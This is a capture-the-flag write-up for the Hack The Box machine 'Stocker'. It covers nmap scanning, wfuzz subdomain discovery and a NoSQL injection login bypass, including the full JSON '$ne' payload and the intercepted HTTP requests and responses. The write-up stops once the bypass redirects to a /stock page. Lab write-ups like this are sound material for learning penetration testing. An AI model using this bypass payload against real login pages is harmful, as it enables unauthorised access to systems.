# HTB Stocker

### Machine IP

```
10.10.11.196
```

### Scanning

```
nmap -sC -sV -Pn -T5 10.10.11.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 01:59 EST
Warning: 10.10.11.196 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.196
Host is up (0.26s latency).
Not shown: 700 closed tcp ports (conn-refused), 298 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://stocker.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So it appears that ports 22 and 80 are open.


### Adding to hosts

Adding `stocker.htb` to the hosts file...

```
$ vim /etc/hosts
```

```
...
10.10.11.196    stocker.htb
...
```

### Exploring stocker.htb

Seems like an "in-development" website that stocks goods to customers. Seems to be only one page with 'in-page' links included.

Page source doesn't seem to include anything interesting. The console seemingly outputs page position for some reason...

Let's run wfuzz to find some subdirectories...

```
$ wfuzz -c --hc 404 -w wordlists/dirbuster/directory-list-2.3-medium.txt http://stocker.htb/FUZZ
```

Nothing interesting came back.

And let's fun wfuzz to find subdomains...

```
$ wfuzz -c -f sub-fighter -w /usr/share/wordlists/amass/subdomains-top1mil-20000.txt -u 'http://stocker.htb' -H "Host: FUZZ.stocker.htb" --hc 301
```

We found something!

```
=====================================================================
ID           Response   Lines    Word       Chars       Payload      
=====================================================================

000000019:   302        0 L      4 W        28 Ch       "dev"   
```

Let's quickly pop it in the hosts file and check it out!

```
$ vim /etc/hosts
```

```
...
10.10.11.196    stocker.htb dev.stocker.htb
...
```


### dev.stocker.htb

This page appears to feature a login panel for developers. Trying username and password as `admin` gives us nothing.

Let's try some SQL Injection.

Runing sqlmap as follows...

```
sqlmap -u http://dev.stocker.htb/login -p "username"
```

Presents us with...nothing useful. Thats SQLi down the drain. I previously learnt about NoSQLi. Might aswell give that a go!

Attempting a login with:
```
Username: admin'||'1==1
Password: cheese
```

No luck.

Let's delve further into NoSQL


### NoSQLi

Running [this tool](https://github.com/C4l1b4n/NoSQL-Attack-Suite) as follows...

```
$ python3 nosql-login-bypass.py -t http://dev.stocker.htb/login -u username -p password
```

Gives us the following output...

```
[*] Checking for auth bypass GET request...
[-] Login is probably NOT vulnerable to GET request auth bypass...

[*] Checking for auth bypass POST request...
[-] Login is probably NOT vulnerable to POST request auth bypass...

[*] Checking for auth bypass POST JSON request...
[+] Login is probably VULNERABLE to POST JSON request auth bypass!
[!] PAYLOAD: {"username": {"$ne": "dummyusername123"}, "password": {"$ne": "dummypassword123"}}
```

SO it appears that NoSQLi is possible via a POST JSON request!


### Burpsuite

Using the information from above, we can use Burpsuite to intercept a POST request and insert JSON (from the NoSQLi attck tool).

```
POST /login HTTP/1.1
Host: dev.stocker.htb
Content-Length: 82
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://dev.stocker.htb
Content-Type: ***application/json***
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://dev.stocker.htb/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3ANVkdtXaLYGvF7_wKsoUmSRrjVrquY5a6.hBph5bZ%2BHKiIW25THWmp4z%2FNJgr2OQ%2BuLG0q55VgNO8
Connection: close

***{"username": {"$ne": "dummyusername123"}, "password": {"$ne": "dummypassword123"}}***
```

*** marks the two places where I have changed the data in the request.

THe response (in the Repeater tab) is...

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 24 Feb 2023 14:25:44 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 56
Connection: close
X-Powered-By: Express
Location: /stock
Vary: Accept

<p>Found. Redirecting to <a href="/stock">/stock</a></p>
```

Where previously it was...

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 24 Feb 2023 14:29:20 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 92
Connection: close
X-Powered-By: Express
Location: /login?error=login-error
Vary: Accept

<p>Found. Redirecting to <a href="/login?error=login-error">/login?error=login-error</a></p>
```

This indicates the existence of a `/stock` page.



